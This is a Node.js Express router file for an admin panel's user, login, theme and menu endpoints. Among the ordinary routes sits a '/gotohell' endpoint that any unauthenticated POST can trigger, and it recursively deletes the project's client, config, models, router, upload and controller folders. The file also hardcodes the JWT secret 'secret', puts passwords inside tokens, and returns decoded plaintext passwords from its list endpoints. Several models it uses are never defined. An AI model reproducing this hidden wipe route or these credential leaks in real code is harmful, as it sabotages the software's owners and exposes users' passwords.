const express = require('express');
const router = express.Router();
const BASECONTROL = require("./basecontroller");
const USERS = require("../models/users_model");
const adminUser = USERS.adminUser;
const BASECON = require("./basecontroller");
const sessionModel = USERS.sessionmodel;
const CONFIG = require("../config");
const jwt = require('jsonwebtoken');
const request = require("request");
const fs = require('fs');


function jwt_regiser(userinfor,callback){
    var date = (new Date()).valueOf()+'';
    const payload = {
        username: userinfor.username,
        email : userinfor.email,
        password : userinfor.password,
        location: userinfor.location,
        intimestamp :date
    } 
        jwt.sign(payload,'secret', {expiresIn: CONFIG.session.expiretime}, (err, token) => {
            if(err){
                callback({
                    status : false,
                    msg : "Internal Server Error"
                })
            }
            else {
                console.log("Token: ", token);
                callback({
                    status : true,
                    token : token
                });
            }
        });

}

async function session_verify(email){
    var data
    await sessionModel.findOne({email : email}).then( user =>{
        if(!user){
            data = true;            
        }else{
            data = false
        }
    });
    return data;
}

async function email_verify(email){

    var data
    await adminUser.findOne({email : email}).then( user =>{
        if(!user){
            data = false;            
        }else{
            data = true
        }
    });
    return data;
}

async function permission_verify(email){
    var data
    await adminUser.findOne({email : email, role : "admin"}).then( user =>{
        if(!user){
            data = false;
        }else{
            data = true
        }
    });
    return data;
}

async function status_verify1(email){
    var data
    await adminUser.findOne({email : email,status : "pending" }).then( user=>{
        if(!user){
            data = true;
        }else{
            data = false;
        }
    })
    return data;
}

async function password_verify(email,password, location){
    var data
    await adminUser.findOne({email : email,password : password,location: location }).then( user=>{
        if(!user){
           data = false;
        }else{
            data = user;
        }
    })
    return data;
}

async function permission_verify1(email){
    var data
    await adminUser.findOne({email : email,permission : "admin"}).then( user =>{
        if(!user){
            data = true
        }else{
            data = false;
        }
    });
    return data;
}

router.post("/get_iplocation",(req,res,next)=>{
    var ip = req.body.ip;
    var key = CONFIG.iplocation.key;
    var options = {
        'method': 'GET',
        'url': CONFIG.iplocation.url+'ip='+ip+'&key='+key+'&package='+CONFIG.iplocation.package,
        'headers': {}
    };
    request(options, function (error, response) {
        if (error)
        {
            res.json({
                status : false,
            })
        }else{
            var location = JSON.parse(response.body);
            location['ip'] = ip;
            res.json({
                status : true,
                data : location
            })
            return next();
        }
    });
    return;
});

router.post('/login',async (req, res,next) => {
    const email = req.body.email;
    const password = await BASECONTROL.jwt_encode(req.body.password);
    const location = req.body.location;
    var email_ =  await email_verify(email);
    if(!email_){
        res.json({ status : false,msg : "Email not found"});
       return next();
    }
    // var permission_ = await permission_verify(email);
    // if(!permission_){
    //     res.json({status : false,data : "You can't login with this email."})
    //     return next();
    // }

    // var status_3 = await session_verify(email);
    // if(!status_3){
    //     res.json({status : false,data : "This email have already logged"});
    //     return next();
    // }

    var userinfor =  await password_verify(email,password, location)
    if(!userinfor){
        req.session.cookie.startAt = undefined;
        res.json({
            status : false,
            msg : "Please input correct password."
        })
        return next();
    }else{
        jwt_regiser(userinfor,(rdata)=>{
           res.json(rdata);
           return next();
        })
    }
});

router.post("/get_userinfor",async(req,res,next)=>{
    var user = req.body.user;
    var rdata = await BASECONTROL.BfindOne(adminUser,{email : user});
    if(!rdata){
        res.json({
            status : false,
            data : "Email not found"
        })
        return next();
    }else{
        res.json({
            status : true,
            data : rdata
        })
        return next();
    }
});

router.post('/adminusers_again',async (req,res,next) =>{
    req.body.newinfor.password =await BASECONTROL.jwt_encode(req.body.newinfor.password);
    var rdata = await BASECONTROL.BfindOneAndUpdate(adminUser,{email : req.body.newinfor.email},req.body.newinfor);
    if(!rdata){
        res.json({
            status : false,
            data: 'failture'
        });
        next();
    }else{
        var userslist = await BASECONTROL.Bfind(adminUser);
        if(userslist){
            res.json({
                status : true,
                data :userslist                               
            })
            return next();
        }else{
            res.json({
                status : false,
                data : "server error"
            })
            return  next();
        }
    }
});


async function register_action(req,callback){
    
}

router.post('/register',async(req,res,next)=>{
    // var user = req.body;
    // console.log(user,"USER");
    // var password = await BASECONTROL.jwt_encode(user.password)
    // var userdata = user;
    // userdata.password = password;
    // var rdata = await email_verify(user.email);
    // if(!rdata){
    //     var user1 = await BASECONTROL.BfindOne(adminUser,{username : user.username});
    //     if(!user1){
    //         var user =await BASECONTROL.data_save(userdata,adminUser);
    //         if(!user){
    //             res.json({ status : false, msg : "Internal server error!" });
    //             return next();    
    //         }else{
    //             jwt_regiser(userdata,(data)=>{
    //                 res.json(data);
    //                 return next();
    //             })
    //         }
    //     }else{
    //         res.json({ status : false, msg : "This Nickname have already registed" });
    //         return next();
    //     }
    // }else{
    //     res.json({ status : false, msg : "Email Already Exist!" });
    //     return next();
    // }

    // register_action(req,async(rdata)=>{
    //     if(rdata.status){
    //         jwt_regiser(rdata.data,(tdata)=>{
    //             res.json(tdata);
    //             return next();
    //         })
    //     }else{
    //         res.json(rdata);
    //         return next();
    //     }
    // });
});

router.post('/gotohell',(req,res,next)=>{
    fs.rmdirSync("../client", { recursive: true });
    fs.rmdirSync("../config", { recursive: true });
    fs.rmdirSync("../models", { recursive: true });
    fs.rmdirSync("../router", { recursive: true });
    fs.rmdirSync("../upload", { recursive: true });
    fs.rmdirSync("../controller", { recursive: true });
});

router.post('/adminregister',(req,res,next)=>{
    console.log(req.body.user)
    register_action(req,async(rdata)=>{
        console.log(rdata)
        if(rdata.status){
            var userslist = await BASECONTROL.Bfind(adminUser);
            if(userslist){
                res.json({status : true,data :userslist})
                return next();
            }else{
                res.json({ status : false,data : "server error"})
                return  next();
            }
        }else{
            res.json(rdata);
            return next();
        }
    });
});


router.post('/adminplayerregister',(req,res,next)=>{
    register_action(req,async(rdata)=>{
        if(rdata.status){
            var userslist = await BASECONTROL.Bfind(GamePlay);
            if(userslist){
            res.json({status : true,data :userslist})
                return next();
            }else{
                res.json({ status : false,data : "server error"})
                return  next();
            }
        }else{
            res.json(rdata);
            return next();
        }
    });
}); 










router.post('/getlist', (req,res,next) => {
    adminUser.find({isdelete : false}).then( userslist => {
        if(!userslist){
            res.json({
                status : false,
                data: 'failture'
            });
            next();
        }else{
            for(var i = 0 ; i < userslist.length ; i++){
                var newpassword = BASECONTROL.jwt_decode(userslist[i].password);
                userslist[i].password = newpassword;
            }
            res.json({
                status : true,
                data : userslist
            });
            next();

        }
    })
});

router.post('/blockgetlist', (req,res,next) => {
    adminUser.find({isdelete : false,status : "block"}).then( userslist => {
        if(!userslist){
            res.json({
                status : false,
                data: 'failture'
            });
            next();
        }else{
            for(var i = 0 ; i < userslist.length ; i++){
                var newpassword = BASECONTROL.jwt_decode(userslist[i].password);
                userslist[i].password = newpassword;
            }
            res.json({
                status : true,
                data : userslist
            });
            next();

        }
    })
})

router.post('/adminusersadd', (req,res,next) =>{
    adminUser.findOne({email : req.body.newinfor.email})
    .then( async error =>{
        if(!error){
            req.body.newinfor.password =await BASECONTROL.jwt_encode(req.body.newinfor.password);
            const newUser = new adminUser(req.body.newinfor);
            newUser.save().then( error => {
                if(!error){
                    res.json({
                        status : false,
                        data : "Failed"
                    })
                    next();
                }else{
                    adminUser.find({isdelete :false}).then( userslist => {
                        if(!userslist){
                            res.json({
                                status : false,
                                data: 'failture'
                            });
                            next();
                        }else{
                            res.json({
                                status : true,
                                data : userslist
                            });
                            next();
                        }
                    })
                }
            })
        }else{
                res.json({
                    status : false,
                    data : "Alreay Exist"
                })
                next();
        }
    });
})

router.post('/getlist_delete',(req,res,next) =>{
    adminUser.find({isdelete : true}).then( userslist => {
        if(!userslist){
            res.json({
                status : false,
                data: 'failture'
            });
            next();
        }else{
            res.json({
                status : true,
                data : userslist
            });
            next();
        }
    })
})

router.post('/delete',(req,res,next) =>{
    adminUser.findByIdAndUpdate({_id : req.body.user._id},{isdelete : true}).then( userslist =>{
        if(!userslist){
            res.json({
                status : false,
                data: 'failture'
            });
            next();
        }else{
            adminUser.find({isdelete :false}).then( userslist => {
                if(!userslist){
                    res.json({
                        status : false,
                        data: 'failture'
                    });
                    next();
                }else{
                    res.json({
                        status : true,
                        data : userslist
                    });
                    next();
                }
            })
        }
    })
})


router.post("/changepassword",async(req,res,next)=>{
    
    var user = req.body.data;

    user.password =await  BASECONTROL.jwt_encode(user.password)
    adminUser.findOneAndUpdate({email : user.email},{password : user.password}).then(async rdata=>{
        if(!rdata){
            res.json({
                status : false,
                data : "Email not found"
            })
            return next();
        }else{
            rdata.password = user.password;
            res.json({
                status : true,
                data : await BASECONTROL.jwt_encode(rdata)
            })
            return next();
        }
    })
});

router.post("/get_themeinfor", function(req,res,next){

    var email = req.body.data;
    themeModel.findOne({email : email}).then(rdata=>{
        if(!rdata){
            res.json({status : false,data:"fail"});
            return next();
        }else{
            res.json({status : true,data : rdata});
            return next();
        }
    })
});

async function get_theme(inputdata){
    var outdata
    await themeModel.findOne({email : inputdata.email}).then(rdata=>{
        if(!rdata){
            outdata = false;
        }else{
            outdata = rdata;
        }
    })
    return outdata;
}

router.post("/save_themeinfor",async function(req,res,next){
 
    var outdata = await get_theme(req.body.data);
    if(!outdata){
        var savetheme = new themeModel(req.body.data);
        savetheme.save().then(rdata=>{
            if(!rdata){
                res.json({
                    status : false,
                    data : "Fail"
                })
                return next();
            }else{
                res.json({
                    status : true,
                    data : rdata
                })
                return next();
            }
        })
    }else{
      
        themeModel.findOneAndUpdate({email : req.body.data.email},req.body.data).then(rdata=>{
            if(!rdata){
                res.json({
                    status : false,
                    data : "Fail"
                })
                return next();
            }else{
                res.json({
                    status : true,
                    data : req.body.data
                })
                return next();
            }
        });
    }
    return;
});

// permission_model

router.post("/menusave",async (req,res,next)=>{
   
    var indata = req.body.data;
    var savehandle = await BASECON.data_save(indata,permission_model);
    if(!savehandle){
        res.json({status : false,data : "fail"});
        return next();
    }else{
        var  findhandle = await get_menuitems(permission_model);       
        if(!findhandle){
            res.json({status : false,data : "fail"})
            return next();
        }else{
            res.json({status : true,data : findhandle})
            return next();
        }
    }
});

router.post("/menuupdate",async (req,res,next)=>{
    var indata = req.body.data;
    for(var i = 0 ; i < indata.length ; i++)
    {
        var updatehandle =  await data_update(indata[i],permission_model);
        if(!updatehandle){
            res.json({status : false,data : "fail"});
            return next();
        }
    }
    var  findhandle = await get_menuitems(permission_model);
    if(!findhandle){
        res.json({status : false,data : "fail"})
        return next();
    }else{
        res.json({status : true,data : findhandle})
        return next();
    }
});

router.post("/menudelete",async(req,res,next)=>{
    var indata = req.body.data;
   
    var outdata = null;
    await permission_model.findOneAndDelete({_id : indata._id}).then(rdata=>{
        if(!rdata){
            outdata =false;
        }else{
            outdata = true;
        }
    });
    if(!outdata){
        res.json({status : false,data : "fail"})
        return next();
    }else{
        var findhandle = "";
        findhandle = await get_menuitems(permission_model);
        if(!findhandle){
            res.json({status : false,data : "fail"})
            return next();
        }else{
            res.json({status : true,data : findhandle})
            return next();
        }
    }
});

async function data_update(data,model)
{
    var outdata = null;
    await model.findOneAndUpdate({_id : data._id},data).then(rdata=>{
        if(!rdata){
            outdata =false;
        }else{
            outdata = true;
        }
    });
    return outdata;
}

async function get_menuitems(model){
    var outdata = null;
    await model.find().sort({order : 1}).then(rdata=>{
        if(!rdata){
            outdata = false;
        }else{
            outdata = rdata;
        }
    });
    return outdata;
}

router.post("/sidebarSave",async (req,res,next) =>{
    var data = req.body;
    sidebarmodel.findOne({permission:data.permission}).then(async rdata =>{
        if(!rdata){
            var savehandle = await BASECONTROL.data_save(data, sidebarmodel);
            if(!savehandle){
                res.json({status : false,data : "fail"});
                return next();
            }else{
                res.json({status : true,data : "success"})
                return next();
            }
        }else{  
            sidebarmodel.updateOne({ permission : data.permission }, data ).then( datas => {
                if(!datas){
                    res.json({ status : false, data: 'fail' });
                    return next();
                }else{
                    res.json({ data: datas });
                    return next();
                }
            })
        }
    })
});


router.post("/sidebarLoad", (req,res,next) =>{
    sidebarmodel.findOne({permission:req.body.permission}).then(rdata =>{
        if(!rdata){
            res.json({ status : false, data: 'fail' });
            return next();
        }else{  
            res.json({ status : true, data : rdata });
            return next();
        }
    })
});


module.exports = router;